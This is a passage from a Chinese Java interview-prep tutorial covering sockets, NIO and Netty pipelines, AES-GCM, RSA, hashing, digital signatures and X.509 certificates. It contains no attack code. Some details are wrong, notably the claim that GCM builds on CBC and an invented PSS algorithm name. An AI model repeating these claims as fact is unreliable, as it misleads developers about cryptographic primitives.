DatagramSocket socket = new DatagramSocket();
byte[] data = "Hello UDP".getBytes();
InetAddress address = InetAddress.getByName("127.0.0.1");
DatagramPacket packet = new DatagramPacket(data, data.length, address, 9090);
socket.send(packet);
socket.close();

// UDP 接收端
DatagramSocket server = new DatagramSocket(9090);
byte[] buffer = new byte[1024];
DatagramPacket packet = new DatagramPacket(buffer, buffer.length);
server.receive(packet); // 阻塞等待
System.out.println("收到: " + new String(packet.getData(), 0, packet.getLength()));
server.close();
```

**🔍 源码解析：**

`ServerSocket.accept()` 底层是阻塞的 `accept()` 系统调用。在 JDK 源码中：

```java
// java.net.ServerSocket
public Socket accept() throws IOException {
    if (isClosed())
        throw new SocketException("Socket is closed");
    if (!isBound())
        throw new SocketException("Socket is not bound yet");
    Socket s = new Socket((SocketImpl) null);
    implAccept(s); // 调用底层的 accept
    return s;
}

void implAccept(Socket s) throws IOException {
    SocketImpl si = null;
    // ...
    // 调用 native 方法，最终到操作系统的 accept() 系统调用
    // accept() 会从全连接队列中取出一个已完成的连接
    // 如果没有已完成的连接，则阻塞等待
    getSImpl().accept(si);
}
```

对于 BIO 模型，每个连接需要一个线程处理，连接数多时线程开销巨大。这就引出了 NIO。

**⚠️ 常见坑/加分回答：**
- `ServerSocket(int port)` 默认 backlog 是 50，生产环境应该显式指定
- `Socket` 的 `InputStream.read()` 在没有数据时会阻塞，不是返回 null，返回 null 表示连接已关闭
- `PrintWriter` 的 `autoFlush=true` 确保每次 `println` 后数据立即发送（不缓冲），否则可能粘在缓冲区

### 第11集：NIO 和 BIO 的区别？Netty 的 ChannelPipeline 事件传播机制是什么？

**💡 核心回答：**

| 特性 | BIO（Blocking IO） | NIO（Non-blocking IO） |
|---|---|---|
| 模型 | 一个连接一个线程 | 一个线程管理多个连接 |
| 核心组件 | Socket/ServerSocket | Channel/Selector/Buffer |
| 数据读写 | 面向流（Stream） | 面向缓冲区（Buffer） |
| 阻塞方式 | 读写阻塞 | 非阻塞 + 多路复用 |

NIO 的核心是 **Selector（多路复用器）**：一个线程通过 Selector 监听多个 Channel 的事件（连接就绪、可读、可写），有事件发生时才处理，避免了 BIO 中线程空等的问题。

**📦 实际例子：**

```java
// NIO 服务端核心代码
Selector selector = Selector.open();
ServerSocketChannel serverChannel = ServerSocketChannel.open();
serverChannel.bind(new InetSocketAddress(9090));
serverChannel.configureBlocking(false); // 非阻塞模式
serverChannel.register(selector, SelectionKey.OP_ACCEPT); // 注册接受连接事件

while (true) {
    selector.select(); // 阻塞直到有事件发生
    Set<SelectionKey> keys = selector.selectedKeys();
    Iterator<SelectionKey> it = keys.iterator();

    while (it.hasNext()) {
        SelectionKey key = it.next();
        it.remove();

        if (key.isAcceptable()) {
            // 新连接到达
            SocketChannel client = serverChannel.accept();
            client.configureBlocking(false);
            client.register(selector, SelectionKey.OP_READ); // 注册读事件
        } else if (key.isReadable()) {
            // 有数据可读
            SocketChannel client = (SocketChannel) key.channel();
            ByteBuffer buffer = ByteBuffer.allocate(1024);
            int len = client.read(buffer);
            if (len > 0) {
                buffer.flip();
                byte[] data = new byte[buffer.remaining()];
                buffer.get(data);
                System.out.println("收到: " + new String(data));
            } else if (len == -1) {
                client.close(); // 客户端关闭连接
            }
        }
    }
}
```

**🔍 源码解析：Netty 的 ChannelPipeline 事件传播机制**

Netty 在 NIO 的基础上封装了 `ChannelPipeline`，本质是一个 **Handler 链**，事件沿链传播：

```java
// Netty 服务端配置
EventLoopGroup bossGroup = new NioEventLoopGroup(1);
EventLoopGroup workerGroup = new NioEventLoopGroup();

ServerBootstrap b = new ServerBootstrap();
b.group(bossGroup, workerGroup)
    .channel(NioServerSocketChannel.class)
    .childHandler(new ChannelInitializer<SocketChannel>() {
        @Override
        protected void initChannel(SocketChannel ch) {
            ChannelPipeline pipeline = ch.pipeline();
            pipeline.addLast(new HttpServerCodec());           // HTTP 编解码
            pipeline.addLast(new HttpObjectAggregator(65536)); // HTTP 消息聚合
            pipeline.addLast(new MyBusinessHandler());         // 业务处理
        }
    });

b.bind(8080).sync().channel().closeFuture().sync();
```

**事件传播机制（核心源码在 `DefaultChannelPipeline`）：**

```
入站事件（Inbound）：从 Head 向 Tail 方向传播
  Head → HttpServerCodec → HttpObjectAggregator → MyBusinessHandler → Tail

出站事件（Outbound）：从 Tail 向 Head 方向传播
  Head ← HttpServerCodec ← HttpObjectAggregator ← MyBusinessHandler ← Tail
```

```java
// Netty 源码：DefaultChannelPipeline.fireChannelRead()
// 入站事件从 head 开始传播
@Override
public ChannelPipeline fireChannelRead(Object msg) {
    AbstractChannelHandlerContext.invokeChannelRead(head, msg);
    return this;
}

// AbstractChannelHandlerContext 中的传播逻辑
static void invokeChannelRead(final AbstractChannelHandlerContext next, Object msg) {
    // ...
    next.invokeChannelRead();
}

private void invokeChannelRead() {
    // 调用当前 Handler 的 channelRead 方法
    ((ChannelInboundHandler) handler()).channelRead(this, msg);
}

// ChannelInboundHandlerAdapter.channelRead 默认行为：传递给下一个 Handler
@Override
public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
    ctx.fireChannelRead(msg); // 关键：调用 ctx.fireXxx() 传递给下一个
}
```

**核心设计**：
1. 每个 Handler 可以只处理自己关心的事件，不关心的调用 `ctx.fireXxx()` 传递给下一个
2. 如果某个 Handler 消费了消息（不调用 fireXxx），事件就**不会继续传播**（这就是为什么 `HttpObjectAggregator` 会聚合完再传递完整消息）
3. `ChannelHandler` 分两类：`ChannelInboundHandler`（入站）和 `ChannelOutboundHandler`（出站），一个 Handler 可以同时实现两个接口

**⚠️ 常见坑/加分回答：**
- Netty 的 `ByteToMessageDecoder` 内部维护了一个 `cumulation` Buffer，每次收到数据追加进去，然后尝试解码。这就是为什么 Netty 能优雅处理粘包
- `@Sharable` 注解标记的 Handler 可以被多个 Channel 共享（如 `SimpleChannelInboundHandler`），但要注意线程安全
- 面试加分：Netty 的 Reactor 模型 —— `bossGroup` 负责 Accept，`workerGroup` 负责 Read/Write，各自独立 EventLoop

## 第四系列：加密算法基础

### 第12集：对称加密 AES 的原理和使用场景？Java 中如何实现？

**💡 核心回答：**

对称加密：**加密和解密使用同一个密钥**。特点是速度快，适合加密大量数据。

AES（Advanced Encryption Standard）是目前最主流的对称加密算法：
- **密钥长度**：128位、192位、256位（越长越安全，128位已足够商用）
- **分组模式**：ECB、CBC、GCM 等
  - **ECB**：每个分组独立加密，相同明文得到相同密文（不安全，不推荐）
  - **CBC**：前一个密文块参与当前明文块的加密，需要 IV（初始化向量）
  - **GCM**：在 CBC 基础上增加了认证标签（AEAD），防篡改，**推荐**

**📦 实际例子：**

加密存储用户敏感信息（如身份证号、手机号）：

```java
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.security.SecureRandom;
import java.util.Base64;

public class AESUtil {

    private static final String ALGORITHM = "AES";
    private static final String TRANSFORMATION = "AES/GCM/NoPadding";
    private static final int GCM_TAG_LENGTH = 128; // 认证标签长度（位）
    private static final int GCM_IV_LENGTH = 12;    // GCM 推荐的 IV 长度（字节）

    /**
     * 生成 AES-256 密钥
     */
    public static SecretKey generateKey() throws Exception {
        KeyGenerator keyGen = KeyGenerator.getInstance(ALGORITHM);
        keyGen.init(256); // AES-256
        return keyGen.generateKey();
    }

    /**
     * AES-GCM 加密
     * @param plaintext 明文
     * @param key       密钥（需要从安全存储中获取，如 KMS）
     * @return Base64 编码的密文（IV + 密文 + 认证标签）
     */
    public static String encrypt(String plaintext, SecretKey key) throws Exception {
        byte[] iv = new byte[GCM_IV_LENGTH];
        new SecureRandom().nextBytes(iv); // 每次加密生成随机 IV

        Cipher cipher = Cipher.getInstance(TRANSFORMATION);
        GCMParameterSpec gcmSpec = new GCMParameterSpec(GCM_TAG_LENGTH, iv);
        cipher.init(Cipher.ENCRYPT_MODE, key, gcmSpec);

        byte[] ciphertext = cipher.doFinal(plaintext.getBytes("UTF-8"));

        // 将 IV 和密文拼接在一起（解密时需要 IV）
        byte[] combined = new byte[iv.length + ciphertext.length];
        System.arraycopy(iv, 0, combined, 0, iv.length);
        System.arraycopy(ciphertext, 0, combined, iv.length, ciphertext.length);

        return Base64.getEncoder().encodeToString(combined);
    }

    /**
     * AES-GCM 解密
     */
    public static String decrypt(String encryptedBase64, SecretKey key) throws Exception {
        byte[] combined = Base64.getDecoder().decode(encryptedBase64);

        // 分离 IV 和密文
        byte[] iv = new byte[GCM_IV_LENGTH];
        byte[] ciphertext = new byte[combined.length - GCM_IV_LENGTH];
        System.arraycopy(combined, 0, iv, 0, iv.length);
        System.arraycopy(combined, iv.length, ciphertext, 0, ciphertext.length);

        Cipher cipher = Cipher.getInstance(TRANSFORMATION);
        GCMParameterSpec gcmSpec = new GCMParameterSpec(GCM_TAG_LENGTH, iv);
        cipher.init(Cipher.DECRYPT_MODE, key, gcmSpec);

        byte[] plaintext = cipher.doFinal(ciphertext);
        return new String(plaintext, "UTF-8");
    }

    // 使用示例
    public static void main(String[] args) throws Exception {
        SecretKey key = generateKey();
        String phone = "13800138000";

        String encrypted = encrypt(phone, key);
        System.out.println("加密后: " + encrypted);

        String decrypted = decrypt(encrypted, key);
        System.out.println("解密后: " + decrypted);
        // 输出: 13800138000 ✓
    }
}
```

**🔍 源码解析：**

`javax.crypto.Cipher` 是 Java 加密体系的核心类。其工作原理：

```java
// Cipher.getInstance("AES/GCM/NoPadding") 的加载过程：
// 1. 从 JCA Provider 列表中查找支持 "AES/GCM/NoPadding" 的 Provider
// 2. 默认使用 SunJCE Provider（com.sun.crypto.provider.SunJCE）
// 3. SunJCE 内部实现：
//    - AES 算法 → com.sun.crypto.provider.AESCrypt（底层调用硬件 AES-NI 指令）
//    - GCM 模式 → com.sun.crypto.provider.GaloisCounterMode
//    - NoPadding → 不需要填充（GCM 是流式模式）

// 关键源码路径：
// javax.crypto.Cipher → CipherSpi → AESCrypt + GaloisCounterMode
```

Java 的加密体系（JCA - Java Cryptography Architecture）分为三层：
1. **API 层**：`Cipher`、`MessageDigest`、`KeyGenerator` 等
2. **SPI 层**：`CipherSpi`、`MessageDigestSpi` 等（Provider 实现这些抽象类）
3. **Provider 层**：`SunJCE`、`SunJCA`、`BC`（BouncyCastle）等具体实现

**⚠️ 常见坑/加分回答：**
- **永远不要用 ECB 模式**！相同明文得到相同密文，攻击者可以通过密文模式推断明文结构
- **IV 不需要保密**，但必须每次加密都随机生成，且不能重复使用（GCM 模式下 IV 重用是灾难性的，会泄露认证密钥）
- 密钥管理是最大挑战：不要把密钥硬编码在代码中，应该使用 KMS（密钥管理服务）或环境变量
- 面试加分：AES-GCM 是 AEAD（Authenticated Encryption with Associated Data），既加密又认证，不需要额外的 MAC

### 第13集：非对称加密 RSA 的原理和使用场景？Java 中如何实现？

**💡 核心回答：**

非对称加密：使用**一对密钥**——公钥（公开）加密，私钥（保密）解密。

核心数学原理（简化）：
- 选两个大素数 p 和 q，计算 n = p × q
- 基于大数分解难题：知道 n 很难反推出 p 和 q
- 公钥 = (n, e)，私钥 = (n, d)，其中 e 和 d 满足特定数学关系
- 加密：c = m^e mod n，解密：m = c^d mod n

**性能对比**：RSA 加密速度比 AES 慢 100-1000 倍，所以实际中：
- **RSA 用于加密对称密钥**（密钥交换），而非直接加密数据
- 这就是 HTTPS 中 TLS 握手的过程：用 RSA/ECDHE 协商出 AES 会话密钥

**📦 实际例子：**

场景：API 接口签名验证（私钥签名，公钥验签）

```java
import java.security.*;
import java.security.spec.PKCS8EncodedKeySpec;
import java.security.spec.X509EncodedKeySpec;
import java.util.Base64;

public class RSAUtil {

    /**
     * 生成 RSA 密钥对
     */
    public static KeyPair generateKeyPair() throws Exception {
        KeyPairGenerator keyGen = KeyPairGenerator.getInstance("RSA");
        keyGen.initialize(2048); // 推荐至少 2048 位
        return keyGen.generateKeyPair();
    }

    /**
     * 用私钥签名
     */
    public static String sign(byte[] data, PrivateKey privateKey) throws Exception {
        Signature signature = Signature.getInstance("SHA256withRSA");
        signature.initSign(privateKey);
        signature.update(data);
        byte[] signBytes = signature.sign();
        return Base64.getEncoder().encodeToString(signBytes);
    }

    /**
     * 用公钥验签
     */
    public static boolean verify(byte[] data, String signBase64, PublicKey publicKey) throws Exception {
        Signature signature = Signature.getInstance("SHA256withRSA");
        signature.initVerify(publicKey);
        signature.update(data);
        byte[] signBytes = Base64.getDecoder().decode(signBase64);
        return signature.verify(signBytes);
    }

    /**
     * RSA 加密（用于加密对称密钥，不要加密大段数据）
     */
    public static byte[] encrypt(byte[] data, PublicKey publicKey) throws Exception {
        Cipher cipher = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding");
        cipher.init(Cipher.ENCRYPT_MODE, publicKey);
        return cipher.doFinal(data);
    }

    /**
     * RSA 解密
     */
    public static byte[] decrypt(byte[] data, PrivateKey privateKey) throws Exception {
        Cipher cipher = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding");
        cipher.init(Cipher.DECRYPT_MODE, privateKey);
        return cipher.doFinal(data);
    }

    // 使用示例：API 接口签名
    public static void main(String[] args) throws Exception {
        KeyPair keyPair = generateKeyPair();

        // 模拟 API 请求数据
        String requestBody = "{\"amount\":100,\"timestamp\":1700000000,\"nonce\":\"abc123\"}";

        // 客户端用私钥签名
        String signature = sign(requestBody.getBytes(), keyPair.getPrivate());
        System.out.println("签名: " + signature);

        // 服务端用公钥验签
        boolean isValid = verify(requestBody.getBytes(), signature, keyPair.getPublic());
        System.out.println("验签结果: " + isValid); // true

        // 模拟：用 RSA 加密 AES 密钥（TLS 握手的原理）
        Key aesKey = AESUtil.generateKey();
        byte[] encryptedAesKey = encrypt(aesKey.getEncoded(), keyPair.getPublic());
        byte[] decryptedAesKey = decrypt(encryptedAesKey, keyPair.getPrivate());
        // 解密出来的 AES 密钥和服务端生成的一致
    }
}
```

**🔍 源码解析：**

`KeyPairGenerator` 的底层实现：

```java
// KeyPairGenerator.getInstance("RSA") 默认使用 Sun 提供的 RSAKeyPairGenerator
// 源码路径：sun.security.rsa.RSAKeyPairGenerator

// 密钥生成过程（简化）：
// 1. 使用 SecureRandom 生成两个大素数 p 和 q（使用 Miller-Rabin 素性检测）
// 2. 计算 n = p × q
// 3. 选择公钥指数 e（通常是 65537 = 2^16 + 1，费马素数，加速加密）
// 4. 计算私钥指数 d = e^(-1) mod φ(n)，其中 φ(n) = (p-1)(q-1)
// 5. 构造公钥 (n, e) 和私钥 (n, d)

// java.security.KeyPairGenerator 内部调用链：
// KeyPairGenerator.getInstance("RSA")
//   → KeyPairGeneratorSpi (sun.security.rsa.RSAKeyPairGenerator)
//     → generateKeyPair()
//       → 使用 java.security.SecureRandom（底层是 /dev/urandom 或 Windows CryptGenRandom）
//       → 调用 BigInteger.probablePrime() 生成大素数
//       → 构造 RSAPublicKeySpec 和 RSAPrivateCrtKeySpec
```

**⚠️ 常见坑/加分回答：**
- RSA 的填充方式很重要：`RSA/ECB/PKCS1Padding` 存在 Bleichenbacher 攻击风险，应该用 `OAEPWithSHA-256AndMGF1Padding`
- RSA 加密有长度限制：2048 位密钥 + OAEP 填充，最多加密 190 字节数据
- **不要把 RSA 私钥放在代码或配置文件中**，应该使用 HSM（硬件安全模块）或 KMS
- 面试加分：现代 TLS 1.3 已经不再使用 RSA 做密钥交换（不满足前向安全性），改用 ECDHE

### 第14集：哈希算法 MD5、SHA-256 的原理？什么是加盐哈希？

**💡 核心回答：**

哈希算法（散列函数）将任意长度的输入映射为固定长度的输出（哈希值），特性：
- **确定性**：相同输入一定得到相同输出
- **不可逆**：无法从哈希值反推原始输入
- **抗碰撞**：几乎不可能找到两个不同输入产生相同哈希值
- **雪崩效应**：输入改变一个 bit，输出的每一位都有约 50% 概率变化

| 算法 | 输出长度 | 安全性 | 速度 | 推荐度 |
|---|---|---|---|---|
| MD5 | 128位 | ❌ 已被破解（可碰撞） | 快 | 仅用于校验文件完整性 |
| SHA-1 | 160位 | ❌ 已被破解 | 快 | 不推荐 |
| SHA-256 | 256位 | ✅ 目前安全 | 中等 | ✅ 推荐 |
| SHA-512 | 512位 | ✅ 目前安全 | 中等 | ✅ 推荐 |
| bcrypt/scrypt/Argon2 | 可变 | ✅ 专为密码设计 | 慢（故意） | ✅ 密码存储推荐 |

**📦 实际例子：**

```java
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.Base64;

public class HashUtil {

    /**
     * SHA-256 哈希
     */
    public static String sha256(String input) throws NoSuchAlgorithmException {
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        byte[] hash = digest.digest(input.getBytes("UTF-8"));
        // 转为十六进制字符串
        StringBuilder hexString = new StringBuilder();
        for (byte b : hash) {
            String hex = Integer.toHexString(0xff & b);
            if (hex.length() == 1) hexString.append('0');
            hexString.append(hex);
        }
        return hexString.toString();
    }

    /**
     * 加盐哈希：防止彩虹表攻击
     * 盐值是和哈希值一起存储的
     */
    public static String hashWithSalt(String password, byte[] salt) throws Exception {
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        digest.update(salt); // 先加入盐值
        byte[] hash = digest.digest(password.getBytes("UTF-8"));
        // 返回 "salt:hash" 格式，方便一起存储
        return Base64.getEncoder().encodeToString(salt) + ":" +
               Base64.getEncoder().encodeToString(hash);
    }

    /**
     * 验证加盐哈希
     */
    public static boolean verifyHash(String password, String storedHash) throws Exception {
        String[] parts = storedHash.split(":");
        byte[] salt = Base64.getDecoder().decode(parts[0]);
        String newHash = hashWithSalt(password, salt);
        // 使用常量时间比较，防止时序攻击
        return MessageDigest.isEqual(
            newHash.getBytes("UTF-8"),
            storedHash.getBytes("UTF-8")
        );
    }

    /**
     * 生成随机盐值
     */
    public static byte[] generateSalt() {
        byte[] salt = new byte[16]; // 128位盐值
        new SecureRandom().nextBytes(salt);
        return salt;
    }

    // 使用示例：用户注册和密码验证
    public static void main(String[] args) throws Exception {
        // 注册时
        String password = "MyP@ssw0rd!";
        byte[] salt = generateSalt();
        String storedHash = hashWithSalt(password, salt);
        System.out.println("存储到数据库: " + storedHash);

        // 登录时验证
        boolean valid = verifyHash("MyP@ssw0rd!", storedHash);
        System.out.println("密码正确: " + valid); // true

        boolean invalid = verifyHash("WrongPassword", storedHash);
        System.out.println("密码错误: " + invalid); // false
    }
}
```

**🔍 源码解析：**

`MessageDigest` 的工作原理：

```java
// MessageDigest.getInstance("SHA-256") 
// → 使用 SUN Provider → sun.security.provider.SHA2$SHA256
// 
// SHA-256 内部实现（Merkle-Damgård 结构）：
// 1. 消息填充：将输入消息填充到 (N * 512 - 64) 位，再附加64位的消息长度
// 2. 分块处理：每512位一块，依次处理
// 3. 每块进行64轮压缩运算（使用位运算、模加等）
// 4. 最终输出256位哈希值

// 核心运算函数（SHA-256 定义了6个）：
// Ch(x,y,z)  = (x ∧ y) ⊕ (¬x ∧ z)
// Maj(x,y,z) = (x ∧ y) ⊕ (x ∧ z) ⊕ (y ∧ z)
// Σ0(x) = ROTR²(x) ⊕ ROTR¹³(x) ⊕ ROTR²²(x)
// Σ1(x) = ROTR⁶(x) ⊕ ROTR¹¹(x) ⊕ ROTR²⁵(x)
// 其中 ROTR 是循环右移

// 初始哈希值 H0-H7（SHA-256 规范定义的前8个素数的平方根的小数部分）
// H0 = 0x6a09e667, H1 = 0xbb67ae85, ...
```

**⚠️ 常见坑/加分回答：**
- **永远不要用 MD5 存储密码**！MD5 碰撞攻击已经成熟，且计算速度极快，GPU 每秒可算百亿次
- **永远不要用裸 SHA-256 存储密码**！应该用 bcrypt/scrypt/Argon2，这些算法故意设计得很慢（消耗 CPU 和内存），防止暴力破解
- 加盐是必须的：相同密码+不同盐=不同哈希值，彩虹表失效
- `MessageDigest.isEqual()` 使用常量时间比较，防止时序攻击（逐字节比较会在第一个不匹配字节就返回，攻击者可以通过响应时间推断哈希值）
- 面试加分：Argon2 是 2015 年密码哈希竞赛的冠军，是目前推荐的密码哈希算法

### 第15集：数字签名的原理和验证流程？和 RSA 加密有什么关系？

**💡 核心回答：**

数字签名 = **用私钥加密消息的哈希值**，接收方用公钥验证。

目的：
- **身份认证**：证明消息确实是发送方签发的（只有发送方有私钥）
- **完整性**：证明消息没有被篡改（哈希值对不上就说明被改了）
- **不可抵赖**：发送方不能否认自己签过名

**签名流程：**
```
发送方：消息 → SHA-256(消息) → 用私钥加密哈希值 → 签名
        发送：消息 + 签名

接收方：收到 消息 + 签名
        1. 用发送方公钥解密签名 → 得到原始哈希值
        2. 对消息重新计算 SHA-256(消息) → 得到新哈希值
        3. 比较两个哈希值：相同 → 签名有效 ✓
```

**📦 实际例子：**

实际业务场景：支付回调签名验证（类似微信支付、支付宝的回调机制）

```java
/**
 * 模拟支付回调签名验证
 * 实际场景中：
 * - 支付平台用自己的私钥对回调数据签名
 * - 商户用支付平台的公钥验证签名
 */
public class PaymentSignatureDemo {

    public static void main(String[] args) throws Exception {
        // === 支付平台端 ===
        KeyPair platformKeyPair = RSAUtil.generateKeyPair();
        
        // 构造回调数据
        String callbackData = "{\"order_id\":\"20240101001\",\"amount\":99.00," +
                              "\"status\":\"SUCCESS\",\"timestamp\":1700000000}";
        
        // 支付平台用私钥签名
        String signature = RSAUtil.sign(
            callbackData.getBytes("UTF-8"),
            platformKeyPair.getPrivate()
        );
        System.out.println("回调签名: " + signature);

        // === 商户服务端 ===
        // 商户持有支付平台的公钥（预先配置好的）
        PublicKey platformPublicKey = platformKeyPair.getPublic();
        
        // 验证签名
        boolean valid = RSAUtil.verify(
            callbackData.getBytes("UTF-8"),
            signature,
            platformPublicKey
        );
        System.out.println("签名验证: " + (valid ? "通过 ✓" : "失败 ✗"));

        // 模拟篡改数据
        String tamperedData = callbackData.replace("99.00", "999.00");
        boolean tamperedValid = RSAUtil.verify(
            tamperedData.getBytes("UTF-8"),
            signature,
            platformPublicKey
        );
        System.out.println("篡改后验证: " + (tamperedValid ? "通过" : "失败 ✗"));
        // 输出: 篡改后验证: 失败 ✗
    }
}
```

**🔍 源码解析：**

`java.security.Signature` 的内部实现：

```java
// Signature.getInstance("SHA256withRSA")
// → 使用 SUN Provider
// → 内部组合了两个操作：
//   1. MessageDigest("SHA-256") → 计算消息哈希
//   2. Cipher("RSA") → 用私钥加密哈希值（签名）/ 用公钥解密（验签）

// 签名过程（initSign + update + sign）：
// 1. initSign(privateKey) → 初始化 RSA 私钥
// 2. update(data) → 将数据喂给 SHA-256 进行哈希计算
// 3. sign() → 
//    a. digest() → 得到 SHA-256 哈希值（32字节）
//    b. 用 PKCS#1 v1.5 或 PSS 填充方案处理哈希值
//    c. RSA 私钥加密 → 得到签名字节数组

// 验签过程（initVerify + update + verify）：
// 1. initVerify(publicKey) → 初始化 RSA 公钥
// 2. update(data) → 同样的哈希计算
// 3. verify(signatureBytes) →
//    a. digest() → 得到本端计算的哈希值
//    b. RSA 公钥解密签名 → 得到发送方声称的哈希值
//    c. 比较两个哈希值
```

**⚠️ 常见坑/加分回答：**
- 数字签名是**先哈希再加密**，不是直接对消息做 RSA 加密（消息可能很大，RSA 有长度限制）
- `SHA256withRSA` 使用 PKCS#1 v1.5 填充，存在 Bleichenbacher 攻击风险；更安全的方案是 `SHA256withRSAandMGF1`（PSS 填充）
- 签名验证只保证"消息来自私钥持有者且未被篡改"，**不保证消息内容保密**（签名是明文的）
- 如果需要既签名又加密：先签名再加密（Sign-then-Encrypt）或先加密再签名（Encrypt-then-Sign），各有优缺点
- 面试加分：ECDSA（基于椭圆曲线的数字签名）比 RSA 签名更快、密钥更短，256位 ECDSA ≈ 3072位 RSA 安全性

## 第五系列：数字证书与 HTTPS 实战

### 第16集：数字证书是什么？CA、证书链、X509 怎么理解？

**💡 核心回答：**

数字证书本质上是一个**包含公钥和身份信息的数据文件**，由可信的第三方（CA，Certificate Authority）签发，证明"这个公钥确实属于这个域名/组织"。

X.509 是证书的格式标准，内容包括：
- 版本号
- 序列号（CA 分配的唯一标识）
- 签名算法（如 SHA256withRSA）
- 颁发者（Issuer）—— 哪个 CA 签发的
- 有效期（Not Before ~ Not After）
- 主体（Subject）—— 证书持有者信息（如域名）
- **主体公钥**（Public Key）—— 最重要的部分
- **CA 的签名** —— CA 用自己的私钥对上述信息签名

**证书链（Chain of Trust）：**
```
根证书（Root CA） ← 预装在操作系统/浏览器中（信任锚点）
    ↓ 签发
中间证书（Intermediate CA） ← 根 CA 签发
    ↓ 签发
终端证书（Server Certificate） ← 中间 CA 签发，绑定了 example.com
```

浏览器验证过程：从终端证书开始，逐级向上验证签名，直到信任的根证书。

**📦 实际例子：**

```java
import java.security.cert.*;
import java.io.FileInputStream;

public class CertificateDemo {

    /**
     * 读取和解析 X.509 证书
     */
    public static void inspectCertificate(String certPath) throws Exception {
        CertificateFactory cf = CertificateFactory.getInstance("X.509");
        X509Certificate cert;
        try (FileInputStream fis = new FileInputStream(certPath)) {
            cert = (X509Certificate) cf.generateCertificate(fis);
        }

        System.out.println("主体: " + cert.getSubjectX500Principal());
        System.out.println("颁发者: " + cert.getIssuerX500Principal());
        System.out.println("有效期: " + cert.getNotBefore() + " ~ " + cert.getNotAfter());
        System.out.println("序列号: " + cert.getSerialNumber().toString(16));
        System.out.println("签名算法: " + cert.getSigAlgName());
        System.out.println("公钥算法: " + cert.getPublicKey().getAlgorithm());

        // 验证证书是否过期
        try {
            cert.checkValidity();
            System.out.println("证书有效 ✓");
        } catch (CertificateExpiredException e) {
            System.out.println("证书已过期 ✗");
        } catch (CertificateNotYetValidException e) {
            System.out.println("证书尚未生效 ✗");
        }
    }

    /**
     * 从 HTTPS 连接中获取服务端证书
     */
    public static void inspectServerCertificate(String url) throws Exception {
        HttpsURLConnection conn = (HttpsURLConnection) new URL(url).openConnection();
        conn.connect();

        Certificate[] certs = conn.getServerCertificates();
        System.out.println("证书链长度: " + certs.length);
        for (int i = 0; i < certs.length; i++) {
            X509Certificate x509 = (X509Certificate) certs[i];
            System.out.println("--- 第 " + i + " 层证书 ---");
            System.out.println("主体: " + x509.getSubjectX500Principal());
            System.out.println("颁发者: " + x509.getIssuerX500Principal());
        }
    }

    // 输出示例（访问 https://www.google.com）：
    // 证书链长度: 3
    // --- 第 0 层证书 ---
    // 主体: CN=www.google.com
    // 颁发者: CN=GTS CA 1C3, O=Google Trust Services LLC
    // --- 第 1 层证书 ---
    // 主体: CN=GTS CA 1C3, O=Google Trust Services LLC
    // 颁发者: CN=GTS Root R1, O=Google Trust Services LLC
    // --- 第 2 层证书 ---
    // 主体: CN=GTS Root R1, O=Google Trust Services LLC
    // 颁发者: OU=GlobalSign Root CA - R2, O=GlobalSign
}
```

**🔍 源码解析：**

证书验证的底层流程（在 TLS 握手中发生）：

```
TLS 握手时，服务端发送 Certificate 消息，包含证书链：

服务端 → 客户端：
  Certificate {
    certificate_list: [
      server_cert,        // 终端证书（CN=api.example.com）
      intermediate_cert   // 中间证书（CN=Let's Encrypt R3）
    ]
    // 根证书不在链中，因为客户端本地已预装
  }

客户端验证流程（Java 中由 sun.security.validator.Validator 处理）：
  1. 检查终端证书的 Subject/SAN（Subject Alternative Name）是否包含目标域名
  2. 检查终端证书的有效期
  3. 用中间证书的公钥验证终端证书上的签名
  4. 用根证书的公钥验证中间证书上的签名
  5. 检查根证书是否在信任库（TrustStore）中
  6. 检查证书是否被吊销（CRL/OCSP）
```

**⚠️ 常见坑/加分回答：**
- Let's Encrypt 的证书有效期只有 90 天（鼓励自动化续期），企业 CA 通常是 1 年
- 证书格式：`.pem`（Base64 文本）、`.der`（二进制）、`.p12`/`.pfx`（含私钥的 PKCS#12 格式）
- Java 的信任库（TrustStore）默认在 `$JAVA_HOME/lib/security/cacerts`，包含 100+ 个根证书
- 面试加分：Certificate Transparency（CT）是 Google 推动的机制，要求所有证书必须记录在公开的日志中，防止 CA 被入侵后悄悄签发恶意证书

### 第17集：HTTPS 配置和证书问题排查，常见错误有哪些？

**💡 核心回答：**

Java 应用中 HTTPS 相关的常见问题及排查方法：

| 错误 | 原因 | 解决方案 |
|---|---|---|
| `SSLHandshakeException: PKIX path building failed` | 服务端证书链无法验证（信任库中没有对应的根 CA） | 导入 CA 证书到 TrustStore |
| `SSLHandshakeException: No subject alternative DNS name matching` | 证书绑定的域名和请求的域名不匹配 | 检查证书 SAN 字段 |
| `SSLHandshakeException: Certificate expired` | 证书过期 | 续签证书 |
| `SSLHandshakeException: Received fatal alert: handshake_failure` | 加密套件不匹配 / TLS 版本不兼容 | 调整支持的协议和套件 |
| `java.security.cert.CertificateException: No name matching found` | 证书 CN/SAN 不包含请求的域名 | 检查证书 |

```java
/**
 * 场景1：自建证书 / 内部 CA → 需要自定义 TrustStore
 */
public class CustomTrustStoreExample {
    public static void main(String[] args) throws Exception {
        // 加载自定义的信任库（包含内部 CA 的根证书）
        KeyStore trustStore = KeyStore.getInstance("JKS");
        try (FileInputStream fis = new FileInputStream("/path/to/custom-truststore.jks")) {
            trustStore.load(fis, "changeit".toCharArray());
        }

        // 创建 TrustManagerFactory
        TrustManagerFactory tmf = TrustManagerFactory.getInstance(
            TrustManagerFactory.getDefaultAlgorithm());
        tmf.init(trustStore);

        // 创建 SSLContext
        SSLContext sslContext = SSLContext.getInstance("TLS");
        sslContext.init(null, tmf.getTrustManagers(), new SecureRandom());

        // 使用自定义 SSLContext 建立连接
        HttpsURLConnection conn = (HttpsURLConnection)
            new URL("https://internal-api.company.com").openConnection();
        conn.setSSLSocketFactory(sslContext.getSocketFactory());
        conn.connect();
    }
}
```

### 第18集：接口签名验证防篡改的完整方案怎么设计？

**💡 核心回答：**

